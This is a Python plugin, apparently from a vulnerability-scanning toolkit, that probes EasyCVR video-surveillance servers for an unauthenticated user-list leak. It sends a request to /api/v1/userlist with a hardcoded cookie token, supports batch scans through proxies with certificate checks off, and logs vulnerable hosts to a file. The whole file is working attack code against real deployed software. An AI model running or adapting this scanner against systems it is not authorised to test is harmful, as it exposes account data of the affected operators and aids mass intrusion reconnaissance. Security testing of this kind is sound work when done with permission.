import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class EasyCVRInfoScan:
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        domain = url.split("://")[-1]
        ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        _, proxys = ReqSet(proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("EasyCVR", "开始检测敏感信息泄漏...")
        headers = {
            "Host":domain,
            "Pragma": "no-cache",
            "Cache-Control": "max-age=0",
            'Sec-Ch-Ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            "Cookie": "token=WfP815MSR",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": header,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "close",
        }
        try:
            req_url = url + "/api/v1/userlist?pageindex=0&pagesize=10"
            response = requests.get(req_url, headers=headers,verify=ssl,proxies=proxys)
            if "name" in response.text:
                OutPrintInfoSuc("EasyCVR",f"存在敏感信息泄漏 {req_url}")
                if self.batch:
                    OutPutFile("easycvr_info.txt",f"存在敏感信息泄漏 {req_url}")
            else:
                if not self.batch:
                    OutPrintInfo("EasyCVR", "不存在敏感信息泄漏")
        except Exception:
            if not self.batch:
                OutPrintInfo("EasyCVR", "目标请求出错")
        if not self.batch:
            OutPrintInfo("EasyCVR", "漏洞检测结束")